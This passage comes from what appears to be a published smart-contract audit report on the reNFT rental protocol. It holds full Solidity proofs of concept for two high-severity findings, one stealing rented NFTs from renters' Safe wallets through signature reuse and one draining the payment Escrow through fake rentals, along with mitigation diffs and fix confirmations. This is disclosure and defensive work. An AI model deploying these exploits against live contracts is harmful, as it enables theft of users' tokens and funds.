} from "@src/libraries/RentalStructs.sol";

import {
    ConsiderationItem,
    OfferItem,
    OrderParameters,
    OrderComponents,
    Order,
    AdvancedOrder,
    ItemType,
    CriteriaResolver,
    Fulfillment, 
    FulfillmentComponent,
    OrderType as SeaportOrderType
} from "@seaport-types/lib/ConsiderationStructs.sol";

import {MockERC721} from "../mocks/tokens/standard/MockERC721.sol";
import {MockERC20} from "../mocks/tokens/standard/MockERC20.sol";
import {MockERC1155} from "../mocks/tokens/standard/MockERC1155.sol";
import {Seaport} from "../fixtures/external/Seaport.sol";
import {OrderParametersLib} from "@seaport-sol/SeaportSol.sol";
import {SafeL2} from "@safe-contracts/SafeL2.sol";
import {Stop} from "../fixtures/protocol/Protocol.sol";


contract AttackerContract {
    address safe;
    address seaportConduit;
    Seaport seaport;
    Order payOrder;
    Order payeeOrder;
    AdvancedOrder payAdvancedOrder;
    AdvancedOrder payeeAdvancedOrder;
    Fulfillment fulfillmentERC721;
    Fulfillment fulfillmentERC20;

    constructor (address _conduit, address _token, Seaport _seaport) public {
        seaportConduit = _conduit;
        seaport = _seaport;
        MockERC20(_token).approve(_conduit, type(uint256).max);
    }

    function getPayOrderParams() external view returns (OrderParameters memory) {
        return payOrder.parameters;
    }

    function getPayeeOrderParams() external view returns (OrderParameters memory) {
        return payeeOrder.parameters;
    }

    function getPayOrderParamsToHash(
        ItemType itemType, 
        address token, 
        uint256 tokenId, 
        uint256 amount
    ) external view returns (OrderParameters memory) {
        OrderParameters memory parameters = payOrder.parameters;
        parameters.offer[0].itemType = itemType;
        parameters.offer[0].token = token;
        parameters.offer[0].identifierOrCriteria = tokenId;
        parameters.offer[0].startAmount = amount;
        parameters.offer[0].endAmount = amount;

        return parameters;
    }

    function storeSafe(address _safe) external {
        safe = _safe;
    }

    function storePayOrder(Order calldata _order) external {
        payOrder = _order;
    }

    function storePayeeOrder(Order calldata _order) external {
        payeeOrder = _order;
    }

    function storePayAdvancedOrder(AdvancedOrder calldata _advancedOrder) external {
        payAdvancedOrder = _advancedOrder;
    }

    function storePayeeAdvancedOrder(AdvancedOrder calldata _advancedOrder) external {
        payeeAdvancedOrder = _advancedOrder;
    }

    function storeFulfillment(Fulfillment calldata _fulfillmentERC721, Fulfillment calldata _fulfillmentERC20) external {
        fulfillmentERC721 = _fulfillmentERC721;
        fulfillmentERC20 = _fulfillmentERC20;
    }

    function stopRental(RentalOrder calldata rentalOrder, Stop stop) external {
        stop.stopRent(rentalOrder);
    }

    function stopRentals(RentalOrder[] calldata rentalOrders, Stop stop) external {
        stop.stopRentBatch(rentalOrders);
    }

    function onERC1155Received(
        address ,
        address ,
        uint256 tokenId,
        uint256 amount,
        bytes calldata
    ) external returns (bytes4) {
        address token = msg.sender;

        _executeCallback(ItemType.ERC1155, token, tokenId, amount);

        return this.onERC1155Received.selector;
    }

    function onERC721Received(
        address ,
        address ,
        uint256 tokenId,
        bytes calldata 
    ) external returns (bytes4) {
        address token = msg.sender;
        uint256 amount = 1;
        
        _executeCallback(ItemType.ERC721, token, tokenId, amount);

        return this.onERC721Received.selector;
    }

    function _executeCallback(ItemType itemType, address token, uint256 tokenId, uint256 amount) internal {
        // update storage for this specific nft
        _initializeNFT(itemType, token, tokenId, amount);

        // approve seaport to handle received NFT 
        _approveSeaportConduit(itemType, token, tokenId);

        // validate pay order 
        _validateOnChain(payOrder);

        // validate payee order
        _validateOnChain(payeeOrder);

        // fulfill order as renter
        _fulfillOrder();
    }

    function _approveSeaportConduit(ItemType itemType, address token, uint256 tokenId) internal {
        if (itemType == ItemType.ERC721) {
            MockERC721(token).approve(seaportConduit, tokenId);
        }
        if (itemType == ItemType.ERC1155) {
            MockERC1155(token).setApprovalForAll(seaportConduit, true);
        }
    }

    function _validateOnChain(Order memory order) internal {
        Order[] memory orders = new Order[](1);
        orders[0] = order;
        seaport.validate(orders);
    }

    function _fulfillOrder() internal {
        AdvancedOrder[] memory advancedOrders = new AdvancedOrder[](2);
        advancedOrders[0] = payAdvancedOrder;
        advancedOrders[1] = payeeAdvancedOrder;

        Fulfillment[] memory fulfillments = new Fulfillment[](2);
        fulfillments[0] = fulfillmentERC721;
        fulfillments[1] = fulfillmentERC20;

        seaport.matchAdvancedOrders(
            advancedOrders,
            new CriteriaResolver[](0),
            fulfillments,
            address(0)
        );
    }

    function _initializeNFT(ItemType itemType, address token, uint256 tokenId, uint256 amount) internal {
        payAdvancedOrder.parameters.offer[0].itemType = itemType;
        payAdvancedOrder.parameters.offer[0].token = token;
        payAdvancedOrder.parameters.offer[0].identifierOrCriteria = tokenId;
        payAdvancedOrder.parameters.offer[0].startAmount = amount;
        payAdvancedOrder.parameters.offer[0].endAmount = amount;

        payeeAdvancedOrder.parameters.consideration[0].itemType = itemType;
        payeeAdvancedOrder.parameters.consideration[0].token = token;
        payeeAdvancedOrder.parameters.consideration[0].identifierOrCriteria = tokenId;
        payeeAdvancedOrder.parameters.consideration[0].startAmount = amount;
        payeeAdvancedOrder.parameters.consideration[0].endAmount = amount;
        payeeAdvancedOrder.parameters.consideration[0].recipient = payable(safe);

        payOrder.parameters.offer[0].itemType = itemType;
        payOrder.parameters.offer[0].token = token;
        payOrder.parameters.offer[0].identifierOrCriteria = tokenId;
        payOrder.parameters.offer[0].startAmount = amount;
        payOrder.parameters.offer[0].endAmount = amount;

        payeeOrder.parameters.consideration[0].itemType = itemType;
        payeeOrder.parameters.consideration[0].token = token;
        payeeOrder.parameters.consideration[0].identifierOrCriteria = tokenId;
        payeeOrder.parameters.consideration[0].startAmount = amount;
        payeeOrder.parameters.consideration[0].endAmount = amount;
        payeeOrder.parameters.consideration[0].recipient = payable(safe);
    }
}

contract StealAllRentedNFTs_POC is BaseTest {

    function testStealAllRentedNFTs() public {
        // ------ Setting up previous state ------ //

        // create and fulfill orders that we will exploit
        (
            Order memory order, 
            OrderMetadata memory metadata, 
            RentalOrder[] memory victimRentalOrders
        ) = _createAndFulfillVictimOrders();

        // ------ Prerequisites ------ //

        // instantiate attackerContract
        AttackerContract attackerContract = new AttackerContract(
            address(conduit), // seaport conduit
            address(erc20s[0]), // token we will use for our rental orders
            seaport
        );

        // send arbitrary # of ERC20 tokens for rental payment to our attackerContract
        erc20s[0].mint(address(attackerContract), victimRentalOrders.length); // we will be stealing from two rentals and use 1 wei for each

        // create a safe for our attackerContract
        address attackerSafe;
        { // to fix stack too deep errors
            address[] memory owners = new address[](1);
            owners[0] = address(attackerContract);
            attackerSafe = factory.deployRentalSafe(owners, 1);
        }
        attackerContract.storeSafe(attackerSafe);
        
        // obtain generic signature for `RentPayload` 
        // this is done via the front-end for any order and we will then use matching `OrderMetadata.rentDuration` and `OrderMetadata.hooks` fields when creating our new order
        // `RentPayload.intendedFulfiller` will be our attackerContract and `RentPayload.fulfillment` will be our attackerContract's safe
        // any expiration given to us by the front-end would do since we will be executing these actions programmatically
        RentPayload memory rentPayload = RentPayload(
            OrderFulfillment(attackerSafe), 
            metadata, 
            block.timestamp + 100, 
            address(attackerContract)
        ); // using Alice's metadata (order) as an example, but could realistically be any order

        // generate the signature for the payload (simulating signing an order similar to Alice's (metadata only) via the front end)
        bytes memory signature = _signProtocolOrder(
            rentalSigner.privateKey,
            create.getRentPayloadHash(rentPayload)
        );

        // ------ Prep `attackerContract` ------ //

        // precompute `validate()` calldata for new order (PAY order) for on-chain validation
        // re-purpose Alice's order (for simplicity) for our use by replacing all necessary fields with values that pertain to our new order
        order.parameters.offerer = address(attackerContract);
        { // to fix stack too deep errors
            ConsiderationItem[] memory considerationItems = new ConsiderationItem[](0);
            order.parameters.consideration = considerationItems; // no consideration items for a PAY order

            OfferItem[] memory offerItems = new OfferItem[](2);
            // offerItems[0] will change dynamically in our attacker contract
            offerItems[1] = OfferItem({
                itemType: ItemType.ERC20,
                token: address(erc20s[0]),
                identifierOrCriteria: uint256(0),
                startAmount: uint256(1),
                endAmount: uint256(1)
            });

            order.parameters.offer = offerItems;

            order.parameters.totalOriginalConsiderationItems = 0; // 0 since this is a PAY order
            
            // store `validate()` calldata for PAY order in attackerContract for later use
            attackerContract.storePayOrder(order);
        }

        // precompute `validate()` calldata for new order (PAYEE order) for on-chain validation (attackerContract is offerer and fulfiller)
        { // to fix stack too deep errors
            ConsiderationItem[] memory considerationItems = new ConsiderationItem[](2);
            // considerationItems[0] will change dynamically in our attacker contract
            considerationItems[1] = ConsiderationItem({
                itemType: ItemType.ERC20,
                token: address(erc20s[0]),
                identifierOrCriteria: uint256(0),
                startAmount: uint256(1),
                endAmount: uint256(1),
                recipient: payable(address(ESCRW))
            });

            order.parameters.consideration = considerationItems; // considerationItems for PAYEE mirror offerItems from PAY

            OfferItem[] memory offerItems = new OfferItem[](0);
            order.parameters.offer = offerItems; // no offerItems for PAYEE

            order.parameters.totalOriginalConsiderationItems = 2; // 2 since this is our PAYEE order

            // store `validate()` calldata for PAYEE order in attackerContract for later use
            attackerContract.storePayeeOrder(order);
        }

        // precompute `matchAdvancedOrders()` calldata for fulfillment of the two orders (PAY + PAYEE) and store in attackerContract
        // construct AdvancedOrder[] calldata
        { // to fix stack too deep errors
            rentPayload.metadata.orderType = OrderType.PAY; // modify OrderType to be a PAY order (necessary for exploit). orderType not checked during signature validation
            AdvancedOrder memory payAdvancedOrder = AdvancedOrder(
                attackerContract.getPayOrderParams(), 
                1, 
                1, 
                hex"",  // signature does not matter 
                abi.encode(rentPayload, signature) // extraData. Note: we are re-using the signature we received from alice's metadata
            );
            rentPayload.metadata.orderType = OrderType.PAYEE; // modify OrderType to be a PAYEE order (necessary for exploit). orderType not checked during signature validation
            AdvancedOrder memory payeeAdvancedOrder = AdvancedOrder(
                attackerContract.getPayeeOrderParams(), 
                1, 
                1, 
                hex"",  // signature does not matter 
                abi.encode(rentPayload, signature) // extraData. Note: we are re-using the signature we received from alice's metadata
            );
            
            // store AdvancedOrder structs in attackerContract for later use
            attackerContract.storePayAdvancedOrder(payAdvancedOrder);
            attackerContract.storePayeeAdvancedOrder(payeeAdvancedOrder);
        }

        // construct Fulfillment[] calldata
        { // to fix stack too deep errors
            FulfillmentComponent[] memory offerCompERC721 = new FulfillmentComponent[](1);
            FulfillmentComponent[] memory considCompERC721 = new FulfillmentComponent[](1);

            offerCompERC721[0] = FulfillmentComponent({orderIndex: 0, itemIndex: 0});
            considCompERC721[0] = FulfillmentComponent({orderIndex: 1, itemIndex: 0});

            FulfillmentComponent[] memory offerCompERC20 = new FulfillmentComponent[](1);
            FulfillmentComponent[] memory considCompERC20 = new FulfillmentComponent[](1);

            offerCompERC20[0] = FulfillmentComponent({orderIndex: 0, itemIndex: 1});
            considCompERC20[0] = FulfillmentComponent({orderIndex: 1, itemIndex: 1});

            Fulfillment memory fulfillmentERC721 = Fulfillment({offerComponents: offerCompERC721, considerationComponents: considCompERC721});
            Fulfillment memory fulfillmentERC20 = Fulfillment({offerComponents: offerCompERC20, considerationComponents: considCompERC20});
            
            // store Fulfillment[] in attackerContract for later use
            attackerContract.storeFulfillment(fulfillmentERC721, fulfillmentERC20);
        }

        // ------ loop through victimRentalOrders to create our complimentary, malicious rentalOrders ------ //

        // pre-compute `RentalOrder` for our new rental orders
        // compute ZoneParameters.orderHash (this is the orderHash for our PAY order)
        RentalOrder[] memory rentalOrders = new RentalOrder[](victimRentalOrders.length);

        for (uint256 i; i < victimRentalOrders.length; i++) {
            Item memory victimItem = victimRentalOrders[i].items[0];
            ItemType itemType;
            if (victimItem.itemType == reNFTItemType.ERC721) {
                itemType = ItemType.ERC721;
            }
            if (victimItem.itemType == reNFTItemType.ERC1155) {
                itemType = ItemType.ERC1155;
            }

            bytes32 orderHash = seaport.getOrderHash(OrderParametersLib.toOrderComponents(
                attackerContract.getPayOrderParamsToHash(itemType, victimItem.token, victimItem.identifier, victimItem.amount), 0)
            );

            // construct the malicious rental order
            Item[] memory items = new Item[](2);
            items[0] = Item(victimItem.itemType, SettleTo.LENDER, victimItem.token, victimItem.amount, victimItem.identifier);
            items[1] = Item(reNFTItemType.ERC20, SettleTo.RENTER, address(erc20s[0]), uint256(1), uint256(0)); // the same for every malicious order

            RentalOrder memory rentalOrder = RentalOrder({
                seaportOrderHash: orderHash,
                items: items, // only PAY order offer items are added in storage
                hooks: metadata.hooks,
                orderType: OrderType.PAY, // only PAY order is added in storage
                lender: address(attackerContract),
                renter: address(attackerContract),
                rentalWallet: attackerSafe,
                startTimestamp: block.timestamp,
                endTimestamp: block.timestamp + metadata.rentDuration // note: rentDuration does not matter
            });

            // set `rentalOrder.rentalWallet` (currently equal to our attackerContract's safe) to be equal to the victim's safe
            rentalOrder.rentalWallet = victimRentalOrders[i].rentalWallet;

            rentalOrders[i] = rentalOrder;
        }

        // ------ Execute exploit ------ //

        // call `stopRentBatch(rentalOrders)`. All fields pertain to our soon-to-be created orders, except for the `rentalWallet`, which is pointing to the victim's safe
        // attackerContract.stopRental(rentalOrder[0], stop);
        // attackerContract.stopRental(rentalOrder[1], stop);
        attackerContract.stopRentals(rentalOrders, stop);
        
        // ------ Loop over all victimRentalOrders to verify end state ------ //

        // speed up in time past the victimRentalOrders' expiration
        vm.warp(block.timestamp + 750);

        for (uint256 i; i < victimRentalOrders.length; i++) {
            Item memory victimItem = victimRentalOrders[i].items[0];

            // verify that our attackerContract's safe is now the owner of the NFT
            if (victimItem.itemType == reNFTItemType.ERC721) {
                assertEq(MockERC721(victimItem.token).ownerOf(victimItem.identifier), attackerSafe);
            }
            if (victimItem.itemType == reNFTItemType.ERC1155) {
                assertEq(MockERC1155(victimItem.token).balanceOf(attackerSafe, victimItem.identifier), victimItem.amount);
            }

            // verify that our rentalOrder has been stopped (deleted from storage)
            RentalOrder memory rentalOrder = rentalOrders[i];
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);
            assertEq(STORE.orders(rentalOrderHash), false);

            // lender attempts to stop victimRentalOrder, but call fails (renter's safe is no longer the owner of the NFT)
            vm.startPrank(victimRentalOrders[i].lender);
            vm.expectRevert();
            stop.stopRent(victimRentalOrders[i]);
            vm.stopPrank();

            // verify that victimRentalOrder has not been stopped (is still in storage)
            bytes32 victimRentalOrderHash = create.getRentalOrderHash(victimRentalOrders[i]);
            assertEq(STORE.orders(victimRentalOrderHash), true);
        }

        // renters' rental payments to lenders' is still in the escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(victimRentalOrders.length * 100));

        // verify that our attackerContract received its rental payment back from all the created malicious orders
        assertEq(erc20s[0].balanceOf(address(attackerContract)), victimRentalOrders.length);

        // End result:
        // 1. Lenders' NFTs were stolen from renters' safe wallet and is now frozen in the attackerContract's safe wallet
        // 2. Renters' rental payments to Lenders are frozen in the Escrow contract since their rentals can not be stoppped
    }

    function _createAndFulfillVictimOrders() internal returns (
        Order memory order, 
        OrderMetadata memory metadata,
        RentalOrder[] memory rentalOrders
    ) {
        // create a BASE order ERC721
        createOrder({
            offerer: alice,
            orderType: OrderType.BASE,
            erc721Offers: 1,
            erc1155Offers: 0,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // finalize the order creation 
        (
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) = finalizeOrder();

        // create an order fulfillment
        createOrderFulfillment({
            _fulfiller: bob,
            order: order,
            orderHash: orderHash,
            metadata: metadata
        });

        // finalize the base order fulfillment
        RentalOrder memory rentalOrderA = finalizeBaseOrderFulfillment();
        bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrderA);

        // assert that the rental order was stored
        assertEq(STORE.orders(rentalOrderHash), true);

        // assert that the token is in storage
        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);

        // assert that the fulfiller made a payment
        assertEq(erc20s[0].balanceOf(bob.addr), uint256(9900));

        // assert that a payment was made to the escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));

        // assert that a payment was synced properly in the escrow contract
        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));

        // assert that the ERC721 is in the rental wallet of the fulfiller
        assertEq(erc721s[0].ownerOf(0), address(bob.safe));

        // create a BASE order ERC1155
        createOrder({
            offerer: carol,
            orderType: OrderType.BASE,
            erc721Offers: 0,
            erc1155Offers: 1,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // finalize the order creation 
        (
            order,
            orderHash,
            metadata
        ) = finalizeOrder();

        // create an order fulfillment
        createOrderFulfillment({
            _fulfiller: dan,
            order: order,
            orderHash: orderHash,
            metadata: metadata
        });

        // finalize the base order fulfillment
        RentalOrder memory rentalOrderB = finalizeBaseOrderFulfillment();
        rentalOrderHash = create.getRentalOrderHash(rentalOrderB);

        // assert that the rental order was stored
        assertEq(STORE.orders(rentalOrderHash), true);

        // assert that the token is in storage
        assertEq(STORE.isRentedOut(address(dan.safe), address(erc1155s[0]), 0), true);

        // assert that the fulfiller made a payment
        assertEq(erc20s[0].balanceOf(dan.addr), uint256(9900));

        // assert that a payment was made to the escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(200));

        // assert that a payment was synced properly in the escrow contract
        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(200));

        // assert that the ERC721 is in the rental wallet of the fulfiller
        assertEq(erc1155s[0].balanceOf(address(dan.safe), 0), uint256(100));

        RentalOrder[] memory rentalOrders = new RentalOrder[](2);
        rentalOrders[0] = rentalOrderA;
        rentalOrders[1] = rentalOrderB;

        return (order, metadata, rentalOrders);
    }
}
```

</details>


**Additional PoC for "lesser" `high` severity/impact vulnerability achieved via only exploiting bug `#2`: [reNFT-StealERC1155Tokens_PoC.md](https://gist.github.com/0xJCN/f8cae30d0e3f9d8c6f05a4a4fa9d2558)**

### Recommended Mitigation Steps

By addressing the non-compliant EIP-712 functions we can mitigate the main exploit path described in this report. I would suggest the following changes:

```diff
diff --git a/./src/packages/Signer.sol b/./src/packages/Signer.sol
index 6edf32c..ab7e62e 100644
--- a/./src/packages/Signer.sol
+++ b/./src/packages/Signer.sol
@@ -188,6 +188,7 @@ abstract contract Signer {
                     order.orderType,
                     order.lender,
                     order.renter,
+                    order.rentalWallet,
                     order.startTimestamp,
                     order.endTimestamp
                 )
```

```diff
diff --git a/./src/packages/Signer.sol b/./src/packages/Signer.sol
index 6edf32c..c2c375c 100644
--- a/./src/packages/Signer.sol
+++ b/./src/packages/Signer.sol
@@ -232,8 +232,10 @@ abstract contract Signer {
             keccak256(
                 abi.encode(
                     _ORDER_METADATA_TYPEHASH,
+                    metadata.orderType,
                     metadata.rentDuration,
-                    keccak256(abi.encodePacked(hookHashes))
+                    keccak256(abi.encodePacked(hookHashes)),
+                    metadata.emittedExtraData
                 )
             );
     }
```

I would also suggest that the `RentPayload`, which is the signature digest of the server-side signer, be modified to include a field that is unique to the specific order that is being signed. This would disable users from obtaining a single signature and utilizing that signature arbitrarily (for multiple fulfillments/fulfill otherwise "restricted" orders).

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/418#issuecomment-1922074348)**

_Note: See full discussion [here](https://github.com/code-423n4/2024-01-renft-findings/issues/418)._

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> Mitigation of this issue is the result of mitigating a handful of other findings (H-07, M-13, M-11, M-06).

**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/45), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/34) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/6).

***

## [[H-06] Escrow contract can be drained by creating rentals that bypass execution invariant checks](https://github.com/code-423n4/2024-01-renft-findings/issues/387)
*Submitted by [juancito](https://github.com/code-423n4/2024-01-renft-findings/issues/387), also found by DeFiHackLabs ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/433), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/431), [3](https://github.com/code-423n4/2024-01-renft-findings/issues/427))*

<https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L540-L544> 

<https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L695>

The Escrow contract where ERC20 tokens are escrowed for payments can be completely drained.

### Proof of Concept

It is possible to create rentals where no assets are transfered, but storage is still updated as normal. Then these fake rentals can be stopped to drain ERC20 tokens from the Escrow contract.

The `Create` contract [checks the expected receivers of ERC20 tokens and NFTs via `_executionInvariantChecks()`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L540-L544).

This is to make sure that ERC20 tokens go to the Escrow contract, while NFTs go to the corresponding Safe wallet.

The key point of the attack is to fulfill an order, so that [the executions length is zero and no execution is checked](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol#L695).

This is possible by making the offerer fulfill all the considerations within the same address of the offers.

I'm assuming this is because of point 9 in the [Match Orders section of SeaPort Docs](https://docs.opensea.io/reference/seaport-overview#section-match-orders). Nevertheless, since SeaPort was forked, the coded POC still shows how the attack is possible.

> 9.  Perform transfers as part of each execution
>
> *   Ignore each execution where \`to == from\`\`

To put it in an example:

1.  Carol signs a normal `PAY` rental order with an NFT + ERC20 tokens as an offer
2.  Carol signs the malicious `PAYEE` counterpart order setting the recipient as her address (instead of the Safe for the NFT, and the ESCRW for the ERC20 tokens)
3.  Carol matches those orders via the forked SeaPort
4.  SeaPort calculates the `totalExecutions`, and since all offers and considerations are from the same address, there are no executions, as there will be no transfers
5.  Both the `PAY` & `PAYEE` ordered are fulfilled and call `Create::validateOrder()`
6.  No recipient checks are performed, since there are no executions
7.  The `STORE` storage [will add the new rental](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L595) for Carol, while [increasing the deposit amount in the Escrow](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L601)
8.  SeaPort ends the order matching and fulfillment without performing any transfer
9.  The rent can be stopped and it will drain the Escrow contract of any token + amount specified in the fake rent

The following POC proves how this is still possible with the forked SeaPort version and the current contracts.

Note: For the sake of simplicity this POC:

*   It [deals](https://book.getfoundry.sh/cheatcodes/deal?highlight=deal#deal) some ERC20 tokens to the Escrow contract to be stolen (instead of simulating another legit rental). It doesn't affect the outcome, as the tokens are stolen, regardless of whom they "belong to".
*   It uses a fixture `carol.safe = SafeL2(payable(carol.addr));` just to make an ad-hoc replacement [for the ERC721 consideration recipient](https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L213) in the `PAYEE` order creation, and make the POC shorter. It is reset right after `createOrder()` is called.
*   It uses a fixture `ESCRW = PaymentEscrow(carol.addr);` just to make an ad-hoc replacement [for the ERC20 consideration recipient](https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L250) in the `PAYEE` order creation, and make the POC shorter. It is reset right after `createOrder()` is called.

Create a new file with this test in `smart-contracts/test/integration/Drain.t.sol`:

<Details>

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.20;

import {
    Order,
    FulfillmentComponent,
    Fulfillment,
    ItemType as SeaportItemType
} from "@seaport-types/lib/ConsiderationStructs.sol";

import {Errors} from "@src/libraries/Errors.sol";
import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";

import {BaseTest} from "@test/BaseTest.sol";
import {ProtocolAccount} from "@test/utils/Types.sol";

import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
import {Safe} from "@safe-contracts/Safe.sol";

import {SafeL2} from "@safe-contracts/SafeL2.sol";
import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";

contract TestDrain is BaseTest {
    function test_Drain_Escrow() public {
        // create a legit PAY order
        createOrder({
            offerer: carol,
            orderType: OrderType.PAY,
            erc721Offers: 1,
            erc1155Offers: 0,
            erc20Offers: 1,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 0
        });

        // finalize the pay order creation
        (
            Order memory payOrder,
            bytes32 payOrderHash,
            OrderMetadata memory payOrderMetadata
        ) = finalizeOrder();

        // create an order fulfillment for the pay order
        createOrderFulfillment({
            _fulfiller: carol,
            order: payOrder,
            orderHash: payOrderHash,
            metadata: payOrderMetadata
        });

        // << Malicious order creation below >>

        // fixtures to replace the ERC721 and ERC20 recipients in `createOrder()`
        // https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L213
        // https://github.com/re-nft/smart-contracts/blob/main/test/fixtures/engine/OrderCreator.sol#L250
        SafeL2 carolSafe = carol.safe;
        PaymentEscrow tempESCRW = ESCRW;
        carol.safe = SafeL2(payable(carol.addr));
        ESCRW = PaymentEscrow(carol.addr);

        // create a malicious PAYEE order.
        // It will set the ERC721 and ERC20 recipients as Carol herself
        createOrder({
            offerer: carol,
            orderType: OrderType.PAYEE,
            erc721Offers: 0,
            erc1155Offers: 0,
            erc20Offers: 0,
            erc721Considerations: 1,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // reset fixtures
        carol.safe = carolSafe;
        ESCRW = tempESCRW;

        // finalize the pay order creation
        (
            Order memory payeeOrder,
            bytes32 payeeOrderHash,
            OrderMetadata memory payeeOrderMetadata
        ) = finalizeOrder();

        // create an order fulfillment for the payee order
        createOrderFulfillment({
            _fulfiller: carol,
            order: payeeOrder,
            orderHash: payeeOrderHash,
            metadata: payeeOrderMetadata
        });

        // add an amendment to include the seaport fulfillment structs
        withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});

        // Verify Carol's balances and the Escrow balance before the rental attack is performed
        assertEq(erc20s[0].balanceOf(carol.addr), uint256(10000));
        assertEq(erc721s[0].ownerOf(0), address(carol.addr));
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));

        // finalize the order pay/payee order fulfillment
        (
            RentalOrder memory payRentalOrder,
            RentalOrder memory payeeRentalOrder
        ) = finalizePayOrderFulfillment();

        // << The first part of the attack was performed >>
        // A new rental was created without any token transfers

        // get the rental order hashes
        bytes32 payRentalOrderHash = create.getRentalOrderHash(payRentalOrder);
        bytes32 payeeRentalOrderHash = create.getRentalOrderHash(payeeRentalOrder);

        // assert that the rental order WAS STORED
        assertEq(STORE.orders(payRentalOrderHash), true);

        // assert that the token IS IN STORAGE
        assertEq(STORE.isRentedOut(address(carol.safe), address(erc721s[0]), 0), true);

        // assert that Carol DID NOT MAKE A PAYMENT (same balance as before)
        assertEq(erc20s[0].balanceOf(carol.addr), uint256(10000));

        // assert that NO PAYMENT WAS MADE to the Escrow contract
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));

        // assert that a payment was synced ERRONEOUSLY in the escrow contract (as no payment was made)
        assertEq(ESCRW.balanceOf(address(erc20s[0])), uint256(100));

        // assert that the ERC721 IS STILL owned by Carol (it didn't go to the Safe wallet)
        assertEq(erc721s[0].ownerOf(0), address(carol.addr));


        // << The second part of the attack is performed >>

        // speed up in time past the rental expiration
        // it uses the default values, but an attacker would make the expiration as soon as possible
        vm.warp(block.timestamp + 750);

        // Transfer the NFT to the Safe, so that the rent stop succeeds while trying to transfer the NFT back
        vm.prank(carol.addr);
        erc721s[0].safeTransferFrom(carol.addr, address(carol.safe), 0);

        // Deal some tokens to the Escrow to be stolen
        // An attacker would first check the tokens balances of the Escrow contract and craft rents matching them
        deal(address(erc20s[0]), address(ESCRW), 100);
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(100));

        // stop the rental order
        vm.prank(carol.addr);
        stop.stopRent(payRentalOrder);

        // Carol gets back her NFT, while stealing the ERC20 tokens from the Escrow
        assertEq(erc20s[0].balanceOf(carol.addr), uint256(10100));
        assertEq(erc721s[0].ownerOf(0), address(carol.addr));

        // The Escrow contract was drained
        assertEq(erc20s[0].balanceOf(address(ESCRW)), uint256(0));
    }
}
```

</details>

### Recommended Mitigation Steps

I would suggest to check that the corresponding offers / considerations are actually included in the `totalExecutions` and **completely fulfilled** with their **corresponding recipients**.

Adding some notes for the protocol to understand the attack surface:

There are other scenarios possible not exposed on the POC. For example, fulfilling just the NFT as expected to the safe, and only performing the attack on the ERC20, leaving a `totalExecutions` length of 1 (the NFT).  This can be done with ERC1155 as well.

Another possibility would be to fulfill the orders with multiple other ones, which could generate extra phantom executions.

Also note, that it is possible to evoid fulfilling `PAYEE` orders via the zone (as noted on another issue I sent).

All that said regarding the current scope, it would also be recommended to give a second look to the forked SeaPort implementation implementing `totalExecutions` to check if there could be another related attack vector there.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/387#issuecomment-1910352735)**

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/14) - Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol.

**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/7), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/46) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/35).

***

## [[H-07] Attacker can lock lender NFTs and ERC20 in the safe if the offer is set to partial](https://github.com/code-423n4/2024-01-renft-findings/issues/203)
*Submitted by [said](https://github.com/code-423n4/2024-01-renft-findings/issues/203), also found by [hash](https://github.com/code-423n4/2024-01-renft-findings/issues/481) and [fnanni](https://github.com/code-423n4/2024-01-renft-findings/issues/210)*

